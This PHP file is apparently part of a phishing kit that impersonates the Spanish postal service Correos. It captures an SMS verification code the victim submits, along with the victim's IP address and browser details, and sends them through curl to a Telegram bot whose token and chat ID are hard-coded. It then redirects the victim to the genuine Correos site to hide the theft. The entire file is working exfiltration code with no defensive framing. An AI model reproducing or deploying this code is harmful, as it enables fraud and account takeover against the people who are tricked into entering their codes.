<?php
$zabi = getenv("REMOTE_ADDR");
$message .= "--++-----[ Correos SMS]-----++--\n";
$message .= "SMS 2 : ".$_POST['sms']."\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP       : $zabi\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "==============|| By Casaoui ||==============\n";

$website="https://api.telegram.org/bot791004997:AAHUiihdi5ha9GyEnKFDNMJ_tNYtY3Ps1xo";
$chatId=-353641168;  //Receiver Chat Id 
$params=[
    'chat_id'=>'-353641168',
   'text'=>$message,
];
$ch = curl_init($website . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);

header("Location: https://epostal.correos.es/");
?>